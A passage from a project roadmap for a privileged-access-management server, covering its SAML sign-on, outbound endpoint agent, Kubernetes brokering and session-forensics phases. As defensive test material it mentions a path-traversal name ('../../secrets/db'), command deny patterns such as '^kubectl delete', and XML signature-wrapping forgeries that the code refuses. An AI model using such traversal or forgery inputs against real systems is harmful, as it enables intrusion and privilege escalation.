  the same `guardCommand` chokepoint as every other discrete command (Phase
  38), so a deny pattern that happens to match refuses the collection — audited
  as `command.blocked … path:forensics`.
- **Off by default** (`PAM_SESSION_FORENSICS`): it runs an extra command on
  every target after every session, which a site must consent to.
- **The hook is a tracked background task** on the proxy's existing drain
  WaitGroup, so a graceful shutdown waits for an in-flight collection instead
  of leaving an artifact half-written and unaudited — pinned by a test that
  holds a collection open and asserts `Serve` has not returned.

**A call site Phase 155 missed, found here and fixed:** the recordings
listing/playback name policy (`recordingNameRe`) accepted only
`.cast|.winrm.log|.sftp`, so Phase 155's `.k8s.log` transcripts were written
and audited but **invisible to the console and unreachable by the playback
route**. Both new suffixes are now listed, classified (`transcript` /
`forensics`) and servable, with a test that asserts an auditor can actually
reach the evidence.

**Proven end to end, twice over.** Package level: the three argv encodings, the
window filter, ordering, the visible cap, the honest-unavailable shapes, a
`tail -c`-cut leading record skipped rather than fatal, and the flagship — an
obfuscated command whose decoded execve the reconstruction names in the clear.
Proxy level: the hook fires with the right target/credential/actor/window,
does NOT fire for a connection that opened no channel, drains on shutdown, and
an end-to-end run where a session executes an obfuscated pipeline and the
reconstruction (pulled over the same vaulted credential from a fake target
serving fixture audit records) names what actually ran while another session's
exec stays out. API level: the artifact's on-disk SHA-256 matches the audited
one, the artifact carries no secret and states its own limits, unavailability
is a finding, and the refusals (disabled, ZSP, command-blocked, non-SSH) never
touch the target.

**What stays open, stated plainly** (docs/EXTERNAL-INFRA-GAPS.md): kernel-level
IN-session tracing, for the reasons above; it would require pamv1 to run on the
target, which is a different product shape (an agent-based PAM) rather than a
missing feature. This artifact is also only as trustworthy as the target's own
logs — a root operator can tamper with them, exactly as they could unload an
eBPF probe — and it depends on the target running auditd with exec auditing
enabled, which the artifact says out loud when it is not.

Full CI-gate sweep clean: `gofmt`, `go vet`, `staticcheck`, `gosec`,
`govulncheck`, `go test -race ./...`, `go run ./cmd/archgen`. **No new
dependency** (the parser is standard library) and **no schema change**.

**Critical files:** new `internal/sessionforensics/sessionforensics.go`, new
`internal/api/forensics_handlers.go`, `internal/proxy/proxy.go`
(`OnSessionForensics`, `SessionForensics`, `fireForensics`, the
interactive-channel gate), `internal/api/server.go` (options/fields),
`internal/api/recordings_handlers.go` (the name-policy fix),
`internal/config/config.go` (`PAM_SESSION_FORENSICS*`), `cmd/pam-server/main.go`.

## Phase 156 — v0.41.0 ✅

Releases Phase 155 (Kubernetes targets, discrete operations) — a genuine
minor: one new capability, plus the protocol-change strand-guard fix that
phase's call-site review turned up. No schema change (migration high-water
mark stays `0042`).

- [x] **v0.41.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-16 as `ghcr.io/morandeirachema/pamv1:0.41.0` (also
  `latest`), digest
  `sha256:0daa9ff20cca77a253c5f3b26c7bdb3abf1009039c8966589aa168fa5f408ce7`,
  **public** (anonymous pull 200, verified via the GHCR anonymous
  token-exchange flow), with the `pam-agent` binaries attached as in v0.40.0
- [x] All five pins via the sweep; Helm chart `version` 0.31.0 -> **0.32.0**
  (minor, alongside the `appVersion` minor)
- [x] Both READMEs restated (the Tier-6 parity table row already landed in
  Phase 155's own PR — this pass covers every scattered version/phase-count
  mention)
- [x] `docs/README.md`'s currency line, `docs/NIS2-COMPLIANCE.md`'s
  compliance-evidence row and ROADMAP.md's top-banner phase count all
  caught proactively; `CHANGELOG.md` gains the release entry
- [x] Full CI-gate sweep re-verified clean on `main` before tagging:
  `gofmt`, `go vet`, `staticcheck`, `gosec`, `govulncheck`, `go test -race
  ./...`, `go run ./cmd/archgen` (no schema/route drift)

## Phase 155 — Kubernetes target support (discrete operations) ✅

**Closes:** the batch's one **cross-vendor-confirmed** finding — Teleport and
StrongDM each flagged Kubernetes independently and unprompted, the strongest
signal this project's research method produces — and one notably absent from
pamv1's own connector-breadth gap list (README Tier 3 and
EXTERNAL-INFRA-GAPS §7 name Cisco/Juniper/F5, MySQL/Oracle, VMware/SAP/
mainframe, never Kubernetes), so genuinely new rather than a rediscovery.
The batch's biggest item by surface area: a new protocol, a new secret type,
a new leaf package, a new route, a new console screen and a dozen existing
`Protocol ==` call sites to review one at a time.

**The shape, decided before any code.** kubectl's operations split cleanly in
two, and only one half fits anything pamv1 already does well. Discrete
verb+resource calls are ordinary synchronous HTTPS requests — one call in, one
audited result out — which is exactly what `POST /api/targets/{id}/winrm`
already proves end to end. `exec`, `attach` and `port-forward` upgrade the
connection to a multiplexed SPDY/WebSocket stream whose framing would need its
own audit parser (the closest analogue, `guacd`'s Guacamole instruction
framing, is protocol-specific and does not generalize). So: a `kubernetes`
target is a cluster's **API server**, not a host; there is no session to proxy,
and `POST /api/targets/{id}/kubectl` brokers `get`, `logs`, `apply` and
`delete` — with the streaming half documented as an exclusion rather than
half-built.

**Hand-rolled, not `client-go`.** `internal/k8s` speaks the Kubernetes REST
API directly: HTTPS + JSON, four request shapes, ~330 lines. Vendoring
`k8s.io/client-go` would pull in hundreds of packages, its own scheme/codec
machinery and a release cadence tied to the cluster's, to reach the same four
HTTP calls. That is the same reasoning behind every other hand-rolled protocol
client here (`tds`, `winrm`, `guacd`, `oidc`), and the bar this project set for
reaching for a library — *cryptographic verification we should not own*
(`go-webauthn` in Phase 124, `crewjam/saml` in Phase 151) — is not met by an
authenticated JSON request over TLS. **No new dependency at all**: standard
library only.

**No discovery — the caller names the API version.** kubectl maps
`deployments` → `/apis/apps/v1/…` by querying `/api`, `/apis` and each group's
version, which is N+2 requests per operation unless a cache with its own
staleness semantics is introduced. pamv1 takes `api_version` explicitly
(defaulting to core `v1`), so **one operation is one request**, nothing caches
staleness, a CRD works on day one (`resource:"widgets",
api_version:"example.com/v1alpha1"`) and the audited command string is
unambiguous about what was touched. The cost — the operator must know
`apps/v1` — is real and documented; the console form defaults it.

**Path safety is the package's security core.** Namespace, name, resource,
group and version all become URL path segments, so each is validated against
Kubernetes' own naming rules (the upstream DNS-subdomain/label/version regexes,
not an approximation) *before* interpolation and escaped again after. A name
like `../../secrets/db` is refused outright rather than aiming the request
somewhere the audited command string does not describe — pinned by a dedicated
test matrix (traversal in each segment, percent-encoded traversal, newlines,
uppercase, consecutive dots, unknown verbs), each case also asserting the
request never left the process.

**The handler is the WinRM twin, and the plan's own assumption did not
survive contact with the code — for the better.** The plan expected a
Kubernetes handler to hand-roll `viewerTunnel`'s inline gate sequence.
Reading it showed *why* viewerTunnel hand-rolls: it resolves its own principal
from a WebSocket URL token, because browsers cannot set headers on a WS
handshake. A REST endpoint has no such problem, so `runKubectl` rides the
ordinary `authz(CapConnect, …)` middleware and reuses the same helpers
`runWinRM` does — `authorizedForTarget`, `enforceApproval`, `vendorGate`,
`superviseSession` — which means the IP allowlist (118), device/posture checks
(133) and break-glass auditing cover the route for free and there is one fewer
copy of the gate order to drift. `execKubectl` then mirrors `execWinRM`
step for step: echo `kubectl> …` to live watchers, command control, the
`PAM_REQUIRE_RECORDING` check, JIT decrypt, the call, the transcript, the
**durable** audit, and only then release the output (an audit failure withholds
the result with 503, because the operation already reached the cluster).

**Command control reaches Kubernetes, which is the whole point of a PAM
brokering it.** The canonical `kubectl get pods -n prod` line — rendered from
the *normalized* request, so it describes what will actually be sent — is what
`PAM_COMMAND_DENY_FILE` and `PAM_COMMAND_ALLOW_FILE` match. A site can forbid
`^kubectl delete` fleet-wide, or permit only `^kubectl (get|logs)`, with the
same file that governs SSH exec, the WinRM loop and SQL statements (Phase 38's
principle, now covering a fifth path). A blocked operation never reaches the
cluster, is audited `command.blocked … path:kubernetes`, and still leaves a
transcript — the attempt is evidence.

**pamv1 does not re-implement Kubernetes RBAC.** What the vaulted
service-account token may do is the cluster's business; a cluster-side refusal
comes back as its own `403` inside the 200 envelope, with `status:403` on the
audit row — an answer the operator asked for, not a pamv1 failure, exactly as a
non-zero exit code is on the WinRM endpoint.

**Two consolidations fell out of the required call-site review** (the plan
insisted every `Protocol ==` site be audited individually rather than assumed
covered by one switch — it was right):

- `recordWinRM` became `recordExecTranscript(kind, suffix, …)`, one transcript
  writer shared by every REST-side execution path, byte-identical output for
  WinRM. A new brokered command shape can no longer ship recording a different
  shape, or nothing at all.
- The protocol↔secret-type rule became one table (`protocolsFor` /
  `secretTypeFitsProtocol` / `strandedByProtocol`), replacing a rule written
  twice in opposite directions — and **that fixed a real pre-existing defect**:
  `createCredential` refused an `ssh_ca` on a non-ssh target, while
  `updateTarget` refused any protocol change away from `ssh` whenever the
  target held any ZSP credential. Since `IsZSP()` covers `db_zsp` too, the old
  guard both **refused a legitimate `postgres` → `mssql` change** (where
  `db_zsp` is valid on both) and **allowed `postgres` → `ssh`**, stranding a
  `db_zsp` credential no code path could ever serve. Both directions are now
  pinned by tests. The then-dead `hasZSPCredential` was deleted.

**Proven end to end against a fake that can only be satisfied by the vault.**
The API-level test's in-process TLS API server accepts **only** the vaulted
service-account token, so a 200 proves the token came from the vault and that
the operator's own PAM key never reached the cluster; the same test checks the
canonical command, the `k8s.run` audit row, and that the on-disk transcript's
SHA-256 matches the audited one and contains no token. Around it: a cluster
403 surfaced as a result, command control blocking `kubectl delete` while
`get` still runs, request validation (collection delete, logs of a non-pod,
traversal), authorization (no `CapConnect`, wrong protocol, no `k8s_token`
credential, and the protocol policy enforced on a target created while it was
still allowed — via a second server on the same store), and the target rules
(6443 default, `k8s_token` only on `kubernetes`, the strand guard both ways).
The package's own tests pin every verb's method/path/query/content-type
against the same fake, plus the path-injection matrix and the fail-closed
response cap.

**V1 boundaries, each with its reason:** no `exec`/`attach`/`port-forward`
(streaming, no audit-parsing precedent); **bearer tokens only** — a client
certificate is a keypair rather than a string and a cluster cannot revoke one,
which conflicts with pamv1's revoke-and-rotate model; no discovery (above);
one `k8s_token` per target is what the broker uses (a `file` credential
holding a kubeconfig or CA bundle is never sent as a bearer token — hence
`kubeCredential` selects by type rather than taking `creds[0]` the way the
single-credential SSH/WinRM paths do); and **no broker tool** — an AI agent
cannot reach a cluster through pamv1, because a tool whose argument is a
manifest would need policy over arbitrary YAML that `internal/policy`'s
typed-argument model does not express.

**Not verified against a real cluster** — none is available in this
environment (`kind`/k3s would be the honest-verification layer), recorded in
EXTERNAL-INFRA-GAPS.md. Full CI-gate sweep clean: `gofmt`, `go vet`,
`staticcheck` (which caught the newly-dead helper), `gosec`, `govulncheck`,
`go test -race ./...`, `go run ./cmd/archgen` (179 → **180** routes, no schema
drift — this phase adds **no migration**).

**Critical files:** new `internal/k8s/k8s.go`, new
`internal/api/kubernetes_handlers.go`, `internal/api/targets.go`
(protocol/secret maps, 6443 default, the generalized strand guard),
`internal/api/credentials.go` (the shared protocol-fit table, the generalized
transcript writer), `internal/store/store.go` (`SecretTypeK8sToken`),
`internal/api/server.go` (`Options.K8s`, route), `internal/config/config.go`
(`PAM_K8S_*`), `cmd/pam-server/main.go` (CA pool), `internal/web/static/index.html`
(targets option 6 + the `kubectl` screen), `internal/web/testdata/console_check.js`
(the `noRows` opt-out for a screen with no subfile table).

## Phase 154 — v0.40.0 ✅

Releases Phase 153 (outbound-only endpoint agent) — a genuine minor: one new
capability and a second deployable binary. New migration `0042`.

- [x] **v0.40.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-16 as `ghcr.io/morandeirachema/pamv1:0.40.0` (also
  `latest`), digest
  `sha256:46777d55ed4f8f9a7572744da99bb73dcd1bd163f5f6983547339d3383811735`,
  **public** (anonymous pull 200, verified via the GHCR anonymous
  token-exchange flow); **first release to also attach
  `pam-agent_linux_{amd64,arm64}` + `SHA256SUMS`** to the GitHub Release —
  the amd64 asset downloaded back, its checksum verified against
  `SHA256SUMS`, and `-version` reports `0.40.0 (81b49b8…)`, the release
  merge commit
- [x] All five pins via the sweep (Helm `appVersion`, the two k8s
  `deployment.yaml` images, the Flux `GitRepository` tag, the README
  quickstart `TAG`); Helm chart `version` 0.30.0 -> **0.31.0** (minor,
  alongside the `appVersion` minor)
- [x] Both READMEs restated (the Tier-6 parity table row already landed in
  Phase 153's own PR — this pass covers every scattered version/phase-count
  mention, not just the hub lines)
- [x] `docs/README.md`'s currency line, `docs/NIS2-COMPLIANCE.md`'s
  compliance-evidence row and ROADMAP.md's top-banner phase count all
  caught proactively; `CHANGELOG.md` gains the release entry
- [x] Full CI-gate sweep re-verified clean on `main` before tagging:
  `gofmt`, `go vet`, `staticcheck`, `gosec`, `govulncheck`, `go test -race
  ./...`, `go run ./cmd/archgen` (no schema/route drift)

## Phase 153 — Outbound-only endpoint agent (Jump Client-style reachability) ✅

**Closes:** BeyondTrust's Jump Client / Jumpoint — the most architecturally
different item in the whole batch, and the third-from-last. Every other phase
adds a gate, a protocol or a store concept to pamv1's existing dial-out model;
this one **inverts it** for endpoints pamv1 can never reach directly: a NAT'd
branch box, a CGNAT'd contractor laptop, an unattended host behind a firewall
that admits nothing inbound. A jump host (`PAM_SSH_JUMP_*`) does not help
there — the bastion still has to be able to reach the target — and neither
does any amount of firewall pleading in an environment where "open 22 from
the PAM" is not an option.

**What shipped.** A third `cmd/` binary, **`cmd/pam-agent`** (static, CGO-free,
env-configured, `-version`, published as `pam-agent_linux_{amd64,arm64}` +
`SHA256SUMS` on the GitHub Release by `release.yml`, built from the same
checkout as the image), over a new leaf `internal/endpointagent`. Installed on
the endpoint, it dials OUT to pamv1's *existing* `:2222` SSH listener as
`endpoint-agent:<name>` with its own bearer key, requests one RFC 4254 §7.1
`tcpip-forward` (the real `ssh -R` mechanism), and holds the connection open.
When an operator connects to that target, the proxy opens a `forwarded-tcpip`
channel **back through the agent's connection** and runs its ordinary
upstream SSH handshake over it — JIT credential injection, `PAM_SSH_KNOWN_HOSTS`
pinning by the target row's address, recording, live monitoring, command
control and every admission gate are exactly as for a directly dialed target,
and the operator's `ssh -p 2222 root@branch-box@pam-host` is unchanged. New:
`store.EndpointAgent` + `EndpointAgentStore` (migration `0042`, six methods,
store surface 190 → **196**), the shared per-replica `session.EndpointAgents`
registry, `POST/GET /api/endpoint-agents` + `DELETE /api/endpoint-agents/{id}`
(`manage_targets` to create/revoke, `read_inventory` to list; `archgen` 176 →
**179**), `PAM_ENDPOINT_AGENTS_ENABLED` (default off), console menu **28**
(three screens, all under the width harness), audit family `endpoint_agent.*`
plus `via:endpoint-agent:<name>` on the operator's `session.start` row.

**The plan's own architecture note held up exactly.** The *client-side*
transport primitive was free: `golang.org/x/crypto/ssh` — an existing direct
dependency — already implements RFC 4254 §7 reverse forwarding client-side
(`(*Client).Listen`), so `endpointagent.Run` is an `ssh.Client` that dials,
calls `Listen("tcp", "127.0.0.1:0")`, and pipes every accepted stream to one
local address; zero new third-party code. The *server side* was the real
work, and it was where the plan said it would be: pam-server's SSH listener
unconditionally discarded every global request from every peer
(`ssh.DiscardRequests`), including the `tcpip-forward` an agent sends. That
required genuine new server code — recognizing the request from an
agent-class identity, tracking the resulting "listener" (there is no socket;
the registration in `session.EndpointAgents` *is* the listener), and
originating `forwarded-tcpip` channels back through the connection — plus a
new SSH authentication identity structurally distinct from "operator wants a
session against target T". `authenticate` now branches on the
colon-carrying `endpoint-agent:<name>` login form (target names refuse `:`
since Phase 77, so it can never be mistaken for `creduser@target`, exactly
as `join:<token>` already relies on) into `authenticateEndpointAgent`, which
resolves the key by SHA-256 hash against `endpoint_agents` and **never calls
the human resolver** — an operator's key under the agent login is refused,
and an agent's key as an operator password resolves to nothing; the two
identity kinds cannot be swapped for one another, and both directions are
tested. An authenticated agent-class connection goes to `serveEndpointAgent`,
which owns the global-request stream `handleConn` still discards for
everyone else.

**Design decisions that mattered — decided before code, then proven:**

- **The agent is the authority on what it exposes.** pam-server never tells
  the agent where to dial: the address/port in the `tcpip-forward` request are
  nominal labels echoed back on each channel (the client library matches
  channels against them, and refuses port 0 as an originator — one real
  round-trip finding), and every stream lands on the agent's own
  `PAM_AGENT_LOCAL_ADDR` (default `127.0.0.1:22`). A compromised pam-server
  therefore cannot use an agent as a pivot into the endpoint's network. The
  target row's `host:port` is the address *as seen from the endpoint* — pinned
  in known_hosts and written to the audit trail, never dialed by pamv1.
- **The agent's connection carries nothing toward pamv1.** It may open no
  channels (`rejectAll` on the agent's channel stream — a session or a
  `direct-tcpip` attempt is refused, tested), may request only one
  `tcpip-forward` (a second is refused), `cancel-tcpip-forward` and
  `keepalive@openssh.com`; it holds no capability set and is never an
  `auth.Principal`. And the mirror: an operator's connection still cannot
  register a forward at all (tested) — its global requests are discarded as
  before.
- **Tunnel-or-nothing.** While an unrevoked `EndpointAgent` row exists for a
  target, that target is reached ONLY through it: an offline agent is
  `session.error … endpoint agent "x": endpoint agent is not connected`, never
  a silent fallback to a direct dial that would then succeed for the wrong
  reason if the endpoint were reachable after all. Enforced structurally: the
  lookup happens once, inside admit's `session.start` audit closure (so the
  row records `via:endpoint-agent:<name>`), and the result is handed to
  `dialUpstream` as a `via` parameter that replaces the dial function
  outright. Migration `0042`'s partial unique index makes "which agent do I
  tunnel through" unambiguous by construction (one live agent per target,
  revoked rows accumulate as history), and the memstore matches the FK
  cascade on target delete.
- **The agent pins pam-server's host key or refuses to run.**
  `PAM_AGENT_SERVER_HOST_KEY` (an authorized_keys line — `ssh-keyscan -p 2222
  pam-host`) is required; the only way around it is an explicit, loudly
  logged demo-only `PAM_AGENT_INSECURE_SKIP_HOST_KEY=true`. Without this a
  network attacker who could impersonate pam-server would harvest the agent
  key. Since the SSH host key is one key cluster-wide under shared custody,
  a single pinned value covers every replica — which is what makes the next
  point cheap.
- **Per replica, honestly.** An agent's TCP connection terminates on exactly
  one process, so `session.EndpointAgents` is per-replica by design and a
  replica the agent is not connected to reports it offline. Rather than build
  a cross-replica relay nobody asked for, `PAM_AGENT_SERVERS` takes a **list**
  and the agent holds one tunnel per replica — the registry's
  supersede-on-reconnect (a newer registration for the same target closes and
  replaces the older one; a stale release never removes a newer link) covers
  the reconnect-after-blip case cleanly.
- **Reply before Register.** The client only starts accepting
  `forwarded-tcpip` channels for its address once it has the server's reply,
  so registering the link first would let an operator's dial reach the client
  a hair too early and be refused at its end. The tiny window in the other
  order is fail-closed ("offline"), which is the right way round.
- **Revoke kicks.** `DELETE /api/endpoint-agents/{id}` stamps `revoked_at` and
  `Kick`s the live link at once — a revoked agent must not keep serving until
  its next reconnect; the reconnect is then refused as `reason:revoked`
  (tested end to end).
- **SSH targets only, v1.** `POST /api/endpoint-agents` refuses any other
  protocol (422), and `handleConn` refuses defensively too, so a WinRM
  target's agent row can never be silently ignored by a direct HTTP dial. The
  seam is protocol-agnostic (a raw byte stream), so extending it to the
  database proxies is a small later step, not a redesign. No gateway /
  "Jumpoint" mode covering a whole LAN from one install (the plan's own v1
  boundary): one agent, one target, one local port.

**Proven end-to-end, not mocked.** `TestEndpointAgentTunnelJITInjection`
binds the target to a **closed** loopback port — a direct dial cannot succeed
— runs the REAL `internal/endpointagent` client against the REAL proxy (host
key pinned, backoff/keepalive tuned down), exposing the in-process upstream
sshd that accepts ONLY the vaulted password, and an operator's `whoami`
through the proxy returns the upstream's output: the credential the operator
never held was injected just-in-time over the tunnel. It then checks the
`endpoint_agent.connected` and `via:endpoint-agent:` audit rows and the
last-seen stamp, revokes + kicks, and shows the agent's automatic reconnect
refused as `reason:revoked` with the target no longer reachable. Around it:
offline agent → fail-closed `session.error` naming it; every auth refusal
with its audited reason (unknown key, name mismatch, an operator key under
the agent login, an agent key as an operator password, revoked, feature
disabled); the connection-is-inbound-only test (no session channel, no
`direct-tcpip`, no second forward, and no forward from an operator); the
registry contract; the API surface (key once, SSH-only, one live per target,
name validation, live status from a registered link, auditor may list but
not create/revoke, idempotent revoke that kicks, 404 with the feature off);
`cmd/pam-agent`'s env fail-loud rules; and the storetest contract on both
backends (conflict/not-found shapes, revoke semantics, cascade).

**Not verified across a real NAT / CGNAT path** — no such network is
available in this environment; the mechanism is proven in-process and the
30 s keepalive is sized for common middlebox idle timeouts but was not
measured against one (recorded in EXTERNAL-INFRA-GAPS.md). Full CI-gate
sweep clean: `gofmt`, `go vet`, `staticcheck` (one unused-assignment finding
in a new test, fixed), `gosec`, `govulncheck`, `go test -race ./...`, `go run
./cmd/archgen` (176 → **179** routes, schema drift recorded).

**Critical files:** new `cmd/pam-agent/main.go`, new
`internal/endpointagent/endpointagent.go`, new
`internal/proxy/endpointagent.go` (+ `proxy.go`: `authenticate` branch,
`handleConn` dispatch, `dialUpstream(..., via)`), new
`internal/session/endpointagents.go`, `internal/store/store.go`
(`EndpointAgent`, `EndpointAgentStore`), `pgstore/migrations/0042_endpoint_agents.sql`,
`memstore`/`pgstore`/`storetest`, new `internal/api/endpointagent_handlers.go`
(+ `server.go` routes/Options), `internal/config/config.go`
(`PAM_ENDPOINT_AGENTS_ENABLED`), `cmd/pam-server/main.go` (the one shared
registry), `internal/web/static/index.html` (menu 28),
`.github/workflows/release.yml` (agent binaries as Release assets).

## Phase 152 — v0.39.0 ✅

Releases Phase 151 (SAML 2.0 SSO, Service Provider) — a genuine minor: one
new capability. No schema change (migration high-water mark stays `0041`).

- [x] **v0.39.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-16 as `ghcr.io/morandeirachema/pamv1:0.39.0` (also
  `latest`), digest
  `sha256:8c8a8c71530c5cca9ca508c1425d85488e769ad9a90db28efec44e2a6fae61e3`,
  **public** (anonymous pull 200, verified via the GHCR anonymous
  token-exchange flow)
- [x] All five pins via the sweep (Helm `appVersion`, the two k8s
  `deployment.yaml` images, the Flux `GitRepository` tag, the README
  quickstart `TAG`); Helm chart `version` 0.29.0 -> **0.30.0** (minor,
  alongside the `appVersion` minor)
- [x] Both READMEs restated (the Tier-6 parity table row already landed in
  Phase 151's own PR — this pass covers every scattered version/phase-count
  mention, not just the hub lines)
- [x] `docs/README.md`'s currency line, `docs/NIS2-COMPLIANCE.md`'s
  compliance-evidence row and ROADMAP.md's top-banner phase count all
  caught proactively; `CHANGELOG.md` gains the release entry (the per-phase
  story stays in Phase 151's own entry below)
- [x] Full CI-gate sweep re-verified clean on `main` before tagging:
  `gofmt`, `go vet`, `staticcheck`, `gosec`, `govulncheck`, `go test -race
  ./...`, `go run ./cmd/archgen` (no schema/route drift)

## Phase 151 — SAML 2.0 SSO (Service Provider) ✅

**Closes:** Delinea's SAML 2.0 support — Okta/OneLogin/Azure AD and,
specifically, on-prem **AD FS** shops that have no OIDC endpoint at all.
Second phase of the batch's back half (149–157). pamv1 becomes a SAML
Service Provider in the SP-initiated Web Browser SSO profile: `GET
/api/auth/saml/start` mints an AuthnRequest (HTTP-Redirect binding), the IdP
posts a signed `<Response>` to `POST /api/auth/saml/acs` (HTTP-POST
binding), and `GET /api/auth/saml/metadata` serves the SP descriptor an IdP
administrator imports. Follows `internal/oidc`'s exact wiring shape:
`buildSAML` beside `buildOIDC` in `main.go`, presence of `PAM_SAML_SP_URL`
enables, hot-swappable through the same `reconfigure` closure, group/role
attribute → role through the same `auth.MatchedRoles`, the same portal
landing (`pam_token` in the URL fragment) — so the console needed only a
second sign-on link and one effective-config line.

**The deliberate exception to this codebase's hand-roll-every-protocol
posture, reasoned explicitly — the WebAuthn precedent, applied a second
time.** OIDC's RS256 JWT verification is hand-rolled here and is genuinely
small: split on `.`, verify one signature over exact fixed bytes, decode
JSON, done. SAML's XML-DSig has no equivalent "exact fixed bytes" step: the
signature covers a *canonicalized* (Exclusive C14N) form of the XML, and
canonicalization plus `<Reference URI="#id">` resolution plus the
enveloped-signature transform is exactly where the well-known **XML
Signature Wrapping** vulnerability class lives — a validly-signed decoy
assertion travels alongside a forged one, and the code that verifies and the
code that processes walk the DOM differently. That is a different order of
problem than "a JWT with more steps," and it clears this codebase's own
stated bar for reaching for a library ("where crypto-verification risk is
high") more clearly than WebAuthn did. So `internal/saml` delegates the XML
round-trip validation, the XML-DSig verification, `<EncryptedAssertion>`
decryption and the assertion condition checks to `github.com/crewjam/saml`
(+ `russellhaering/goxmldsig`, upgraded to their latest releases,
`govulncheck` clean) and keeps for itself only the pamv1-specific decisions:
what enables the feature, how the IdP metadata is sourced (URL fetch or
inline file — the fetch is the SP's **only** outbound call, ever), which
attribute is the username, which attributes carry the group claims, and how
the resulting `Claims` are shaped so the API layer treats OIDC and SAML
identically. Nothing in the package re-implements a signature check. The
library's `samlsp` middleware (its own cookie/JWT session machinery) is
deliberately *not* used — pamv1 already has sessions; only the
`ServiceProvider` core is.

**Design decisions that mattered:**

- **No schema change.** The AuthnRequest ID needs exactly what an OIDC
  `state` needs — a single-use, expiring, cross-replica record keyed by an
  opaque random ID — so it rides the existing `oidc_states` table through
  `PutOIDCState`/`TakeOIDCState`, with the fixed marker `"saml"` in the
  verifier slot. The ACS refuses a row without that marker, and the OIDC
  callback now refuses a row *with* it (a real PKCE verifier is 43 chars of
  base64; `"saml"` can never be one) — a cross-protocol guard added in the
  same change rather than left implicit. A dedicated table would have meant
  a migration, four store implementations and a method-set pin bump for a
  semantically identical row.
- **The state cookie is `SameSite=None; Secure` over TLS**, not `Lax` like
  OIDC's. The OIDC callback is a top-level GET the IdP redirects to; the SAML
  ACS is a **cross-site top-level POST** from the IdP's auto-submit page, on
  which a `Lax` cookie is not sent at all — the flow would simply always fail
  with `invalid_state` in production. Over plain HTTP `SameSite=None` is
  refused outright by browsers, so there the attribute is left unset and the
  browser's default handling applies (Chrome's two-minute "Lax+POST"
  allowance carries a dev login round trip). Documented in the code and the
  ADMIN-GUIDE, since it is the one place the two SSO flows honestly differ.
- **SP-initiated only, `AllowIDPInitiated=false`.** An unsolicited
  `<Response>` has no `InResponseTo` to bind to the browser that started the
  login — which is exactly the login-CSRF hole the state cookie closes.
  Refusing IdP-initiated SSO is what makes the cookie a real defence rather
  than a formality. The artifact binding is refused too (`ParseXMLResponse`
  is called directly, never `ParseResponse`, so a `SAMLart` never triggers a
  server-side resolution call), and there is no Single Logout — all three
  documented as v1 boundaries, not oversights.
- **The SP metadata is cut down to what the code accepts.** The library
  advertises HTTP-POST *and* artifact ACS endpoints and an SLO endpoint;
  `Metadata()` strips everything but the one HTTP-POST ACS, so an IdP cannot
  be configured to send what pamv1 refuses.
- **Optional SP key pair, off by default.** `PAM_SAML_SP_KEY_FILE` +
  `_CERT_FILE` (RSA, PEM, set together — one half alone is a config error,
  not a silent downgrade) turn on AuthnRequest signing (RSA-SHA256) and
  publish the certificate for encryption, so an IdP configured to require
  signed requests or to encrypt assertions works. Without them the SP still
  verifies every IdP signature. The three `_FILE` settings are env/IaC-only
  — deliberately excluded from the hot-swap whitelist, since a stored console
  override must never be able to make the server read a file on its host.
- **Group attributes default to a well-known set** (`groups`, `memberOf`,
  `role`, ADFS's Token-Groups and Role claim types, Entra's SAML groups
  claim), matched by `Name` *or* `FriendlyName`, case-insensitively, so the
  common ADFS/Okta/Entra configurations work without guessing an attribute
  name — `PAM_SAML_GROUP_ATTR` makes it explicit. The username defaults to
  the NameID; `PAM_SAML_NAME_ATTR` picks an attribute (an ADFS UPN claim)
  instead. A login whose attributes map to **no** role is refused with
  `no_role` — same as OIDC, no default role.
- **`PAM_OT_AIRGAP` refuses the metadata URL** (it joins the same
  `airGapConflicts` list as the OIDC issuer and the webhooks) and expects
  the `_FILE` form — the metadata document carried in on media, no network
  fetch at all; and since the login itself is browser-mediated, a SAML-enabled
  air-gapped server makes no per-login call anywhere.

**Proven end-to-end against a real IdP, not a canned XML fixture.** New
`internal/saml/samltest` runs the library's own `IdentityProvider` in
process — real RSA-2048 self-signed signing key, real metadata endpoint,
driven through exactly the parse → validate → make-assertion → POST-binding
steps its `ServeSSO` handler runs — so every Response the tests consume is
genuinely XML-DSig-signed and, when the SP publishes an encryption
certificate, genuinely encrypted (`xmlenc`). Package tests: happy path
(NameID, default and explicit group attributes, `NameAttr`, session index),
request-ID binding, SP metadata shape, signed AuthnRequest, **encrypted
assertion decrypted and its signature still verified**, and the refusals
that are the whole point — a **tampered attribute value** (the group
escalation an attacker actually wants), a **swapped subject**, **all
signatures stripped**, **wrong audience**, **wrong issuer**, **expired
conditions**, and **both signature-wrapping shapes**: an unsigned escalated
twin of the assertion inserted beside the signed one, once with the
Response-level signature intact (refused — it covers the whole document) and
once with only the assertion signed, the shape most real IdPs emit (the
forged claims are never the ones returned). API tests: the whole browser
flow (start 302 → IdP → ACS POST → session with the mapped admin role,
audited `login … via:saml`), **replay** of the same Response refused (state
consumed, cookie cleared), a tampered Response refused with no session, no
login audit row and its state burnt, a **cross-browser POST** (no state
cookie) refused *without* burning the legitimate browser's still-pending
login — a real test-harness gotcha here: `httptest.Server.Client()` returns
one shared client, so the OIDC test's jar swap would have made two
"browsers" share cookies; the SAML test builds genuinely independent clients
so the second half of that assertion actually means something — unmapped
groups → `no_role`, the metadata endpoint, `saml_login` in the effective
config, and 404 on all three routes without SAML. `cmd/pam-server`'s
`TestBuildSAML` covers the wiring: off without an SP URL, metadata from URL
and from file, the key pair (and one half alone refused), unreachable
metadata and a missing file both fatal.

**Not verified against a live IdP** — no AD FS farm or Okta/OneLogin/Entra
tenant is available in this environment. The mechanism is proven; what a
live tenant would surface is vendor-specific claim-rule configuration
(which attribute name the group claim actually arrives under), recorded in
EXTERNAL-INFRA-GAPS.md alongside every other external-IdP-requiring
capability. Full CI-gate sweep clean: `gofmt`, `go vet`, `staticcheck`,
`gosec`, `govulncheck` (the only module-level advisory, `x/crypto/openpgp`,
predates this phase and is not called), `go test -race ./...`, `go run
./cmd/archgen` (173 → **176** routes, no schema drift).

**Critical files:** new `internal/saml/saml.go` (+ `samltest/`), new
`internal/api/saml_handlers.go`, `internal/api/server.go`
(`Options`/`RuntimeConfig`/routes), `internal/api/oidc_handlers.go` (the
cross-protocol marker guard), `internal/config/config.go` + `settings.go`
(twelve `PAM_SAML_*` vars, nine hot-swappable, the metadata URL in the
